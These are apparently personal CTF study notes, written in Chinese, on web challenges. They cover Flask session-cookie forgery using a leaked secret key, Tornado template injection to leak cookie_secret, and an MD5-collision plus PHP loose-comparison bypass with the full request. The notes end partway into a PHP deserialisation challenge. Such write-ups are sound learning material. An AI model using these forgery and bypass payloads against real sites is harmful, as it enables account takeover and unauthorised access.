# HCTF 2018【admin】

进来是登录注册，随便注册一个进来，把每个页面简单看一下，在`/change`页面发现提示：
![](assets/Day%204/file-20251221224128176.png)
这个连接已经失效了，在别人的wp里面找到了源码：
```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
 
from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response
from flask_login import logout_user, LoginManager, current_user, login_user
from app import app, db
from config import Config
from app.models import User
from forms import RegisterForm, LoginForm, NewpasswordForm
from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep
from io import BytesIO
from code import get_verify_code
 
@app.route('/code')
def get_code():
    image, code = get_verify_code()
    # 图片以二进制形式写入
    buf = BytesIO()
    image.save(buf, 'jpeg')
    buf_str = buf.getvalue()
    # 把buf_str作为response返回前端，并设置首部字段
    response = make_response(buf_str)
    response.headers['Content-Type'] = 'image/gif'
    # 将验证码字符串储存在session中
    session['image'] = code
    return response
 
@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html', title = 'hctf')
 
@app.route('/register', methods = ['GET', 'POST'])
def register():
 
    if current_user.is_authenticated:
        return redirect(url_for('index'))
 
    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)
 
@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
 
    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)
 
@app.route('/logout')
def logout():
    logout_user()
    return redirect('/index')
 
@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)
 
@app.route('/edit', methods = ['GET', 'POST'])
def edit():
    if request.method == 'POST':
         
        flash('post successful')
        return redirect(url_for('index'))
    return render_template('edit.html', title = 'edit')
 
@app.errorhandler(404)
def page_not_found(error):
    title = unicode(error)
    message = error.description
    return render_template('errors.html', title=title, message=message)
 
def strlower(username):
    username = nodeprep.prepare(username)
return username
```
一个flask写的网站。猜测是session伪造。
我们先把session试着揭秘一下：
```powershell
PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py decode -c'.eJw9kMuKwkAQRX9lqLWLpJPZCC6UPDBQHRLaaao24iOadNIOREVt8d-ncUBqeS6nbtUT1oexObcwvYzXZgLrbg_TJ3xtYQooqpg1OjYUS123ZDEivQxKtbuRO4aeWEzoXubVtxRLgZo7dNVNitqyojupYWAj_SwsufSBBgMyS0eutqVexSTSAJOfQQrZcjIXbHZOJkVLqnKcp67UaUhm35NqhzLxGbt6oODBd4hLlfndWeszosxxBq8J7M7jYX357ZvT5wROso5zCtAVvVRFh4oE59LrvEiRk2bvqy0G1Bix6gXpKuL57K3r7ObYfEx1VvSb6p-cNtYDCEUEE7iem_H9NQgDeP0BR_9rEw.aUgE_g.I9fmsEi7JKpAhocyhofr8P7NaCE'

#b'{"_fresh":true,"_id":{" b":"M2Q4ZWMzZjY4NWRhYmM3YWI0OTcwYzg1MzZmMDYxOGQ5N2I2MWZiMzQwN2RmZTYxYTllZjNjNjBmYzEyMjM0YjIzYzRmOWU4Y2E0MDVlN2NhZDA2ZjczNDJhYTQzZGEzOWE1YjdkYThlODNhZmUyM2ZlYWI4OTFmMDFhOWE2OGM="},"csrf_token":{" b":"ZDFiZGY0MzJkNTJiMTY2ZGNlODM2ZTYzNjdmYzBlMWM3ZTk2YWQ3ZA=="},"image":{" b":"RFJkaQ=="},"name":"123","user_id":"10"}'

```
这里不知道那里找`secret_key`，看wp原来是源码里面还有一个`config.py`文件里面有key泄露
```python
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```
拿到key之后直接用工具伪造admin的session就好了:
```powershell
PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJw9kMuKwkAQRX9lqLWLpJPZCC6UPDBQHRLaaao24iOadNIOREVt8d-ncUBqeS6nbtUT1oexObcwvYzXZgLrbg_TJ3xtYQooqpg1OjYUS123ZDEivQxKtbuRO4aeWEzoXubVtxRLgZo7dNVNitqyojupYWAj_SwsufSBBgMyS0eutqVexSTSAJOfQQrZcjIXbHZOJkVLqnKcp67UaUhm35NqhzLxGbt6oODBd4hLlfndWeszosxxBq8J7M7jYX357ZvT5wROso5zCtAVvVRFh4oE59LrvEiRk2bvqy0G1Bix6gXpKuL57K3r7ObYfEx1VvSb6p-cNtYDCEUEE7iem_H9NQgDeP0BR_9rEw.aUgE_g.I9fmsEi7JKpAhocyhofr8P7NaCE'

# {'_fresh': True, '_id': b'3d8ec3f685dabc7ab4970c8536f0618d97b61fb3407dfe61a9ef3c60fc12234b23c4f9e8ca405e7cad06f7342aa43da39a5b7da8e83afe23feab891f01a9a68c', 'csrf_token': b'd1bdf432d52b166dce836e6367fc0e1c7e96ad7d', 'image': b'DRdi', 'name': '123', 'user_id': '10'}

PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'3d8ec3f685dabc7ab4970c8536f0618d97b61fb3407dfe61a9ef3c60fc12234b23c4f9e8ca405e7cad06f7342aa43da39a5b7da8e83afe23feab891f01a9a68c', 'csrf_token': b'd1bdf432d52b166dce836e6367fc0e1c7e96ad7d', 'image': b'DRdi', 'name': 'admin', 'user_id': '10'}"

# .eJw9kE2LwkAMhv_KkrOHOnYvggelH1jIlJZxh-Qi1VbbaceFqqgj_vcdXJAcn5cnb_KE7WFszi3ML-O1mcC2q2H-hK8dzAFFEbJGx4ZCqcuWLM5Ir4Nc7W_kjlNPLEZ0z9PiW4q1QM0duuImRWlZ0Z3UMLCRflaWXPxAgwGZtSNX2lxvQhJxgNHPIIVsOVoKNnsno6wlVThOY5freEqm7km1Qx75jN08UPDgO4S5SvzupPUZkae4gNcE9ufxsL389s3pcwJHSccpBeiyXqqsQ0WCU-l1XqTISVP7aqsBNc5Y9YJ0MePl4q3rbHVsPqYyyfqq-CenynoAVW27E0zgem7G999gGsDrDzDLbIY.aUgK9w.c7LjfT6NKFseSVv7kVt1VSmMpbc

```
拿到session后访问`/index`即可
![500](assets/Day%204/file-20251221230006763.png)
# 护网杯 2018【easy_tornado】
打开是三个路由
![500](assets/Day%204/file-20251221231752625.png)
```
/flag.txt<br>flag in /fllllllllllllag

/hints.txt<br>md5(cookie_secret+md5(filename))

/welcome.txt<br>render
```

`失败的尝试：`
以为是直接php的md5伪造
```php
<?php  
$cookie_secret='tornado';  
$filename="hints.txt";  
echo md5($cookie_secret.md5($filename));
```
试了一下不知道`cookie_secret`是啥放弃了，原来根本不是php......

后来注意到题目是`easy_tornado`,会不会是什么提示？
去搜了一下python中有一个`tornado`模板，可能存在ssti
尝试改变一下`filehash`参数，出现报错页面，试一下ssti
![](assets/Day%204/file-20251221233819138.png)
果然可以解析，我们去学习一下`tornado`的ssti
==简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。==
这里是用到这个知识点，并不是纯粹的ssti
![](assets/Day%204/file-20251222000542057.png)
通过配置信息得到了我们需要的`cookie_secret`
写个脚本加密一下，就好了
```python
import hashlib

def md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()

cookie_secret = "b8675e6e-563d-4781-baa1-5168eb2c268c"
filename = "/fllllllllllllag"

result = md5(cookie_secret + md5(filename))
print(result)
```
![](assets/Day%204/file-20251222002713807.png)
# MRCTF2020【Ez_bypass】
进来给了源代码：
```php


include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}

```
比较简单的php特性题
1. 第一关：
```php
if (md5($id) === md5($gg) && $id !== $gg)
```
第一想法是数组绕过，但是这只在低版本有效，因为我们数组绕过的原理就是md5函数无法处理数组，会返回null
但是高版本`(7.3之前还行)`中md5处理数组时会直接报错
![](assets/Day%204/file-20251222004817213.png)
所以我们这里只能md5强碰撞，强行找到md5值相等的不同字符串
2. 第二关：
```php
if (!is_numeric($passwd))

{

if($passwd==1234567)
```
这里要同时满足两个条件
我们利用php弱比较中`非数字字符串和数字比较时`会解析到非数字字符之前，也就是1234567a会解析为1234567再比较

最后payload：
```http
POST /?gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 HTTP/1.1

host:411f6e29-5c7b-4160-8254-13223d134fa0.node5.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

passwd=1234567a
```

# ZJCTF 2019【NiZhuanSiWei】
```php
# index.php
<?php    
$text = $_GET["text"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){  
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";  
    if(preg_match("/flag/",$file)){  
        echo "Not now!";  
        exit();   
    }else{  
        include($file);  //useless.php        
        $password = unserialize($password);  
        echo $password;  
    }  
}  
else{    highlight_file(__FILE__);  
}  
?>
```

```php
# useless.php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

```php
# flag.php
<br>oh u find it </br>

<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag_is_here");
}

?>
```

首先需要读到`$test`的内容是`welcome to the zjctf`
这个我们怎么控制的？
注意到

